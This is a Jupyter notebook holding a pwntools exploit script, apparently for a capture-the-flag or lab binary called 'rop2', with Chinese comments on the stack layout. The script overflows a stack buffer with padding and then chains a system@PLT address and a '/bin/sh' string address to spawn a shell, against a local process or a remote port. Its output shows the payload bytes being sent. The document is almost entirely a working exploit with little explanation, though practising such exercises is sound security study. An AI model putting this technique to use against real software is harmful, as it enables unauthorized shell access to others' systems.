{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TERMINFO=/usr/share/terminfo\n",
      "env: PWNLIB_NOTERM=true\n"
     ]
    }
   ],
   "source": [
    "%env TERMINFO=/usr/share/terminfo\n",
    "%env PWNLIB_NOTERM=true"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './rop2' argv=['rop2'] \n",
      "[+] Starting local process './rop2' argv=['rop2'] : pid 6691\n",
      "[DEBUG] Sent 0x99 bytes:\n",
      "    00000000  62 62 62 62  62 62 62 62  62 62 62 62  62 62 62 62  │bbbb│bbbb│bbbb│bbbb│\n",
      "    *\n",
      "    00000080  62 62 62 62  62 62 62 62  62 62 62 62  08 a0 04 08  │bbbb│bbbb│bbbb│····│\n",
      "    00000090  24 65 62 70  10 86 04 08  0a                        │$ebp│····│·│\n",
      "    00000099\n",
      "[*] Switching to interactive mode\n",
      "[*] Got EOF while reading in interactive\n"
     ]
    }
   ],
   "source": [
    "# -*- coding: utf-8 -*-\n",
    "#!/usr/bin/env python2\n",
    "from pwn import *\n",
    "context.log_level = 'debug'\n",
    "context.arch = 'x86' #amd64,x86\n",
    "LOCAL = True\n",
    "if LOCAL:\n",
    "    p = process('rop2')\n",
    "else:\n",
    "    p = remote('127.0.0.1',10001)\n",
    "\n",
    "def main():\n",
    "    system_addr = 0x080483A0 #PLT表中的_system地址（延迟绑定）\n",
    "    bin_sh_addr = 0x08048610\n",
    "    payload = 'b'*(0x88+4)+p32(system_addr)+'$ebp'+p32(bin_sh_addr) #栈扩展地址与参数填入的覆盖地址相反，这样就应该先system地址\n",
    "    #p.recvuntil('Name:')\n",
    "    #p.sendline(name)\n",
    "    #p.recvuntil('best:')\n",
    "    p.sendline(payload)\n",
    "    p.interactive()\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    \n",
    "    main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15rc1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
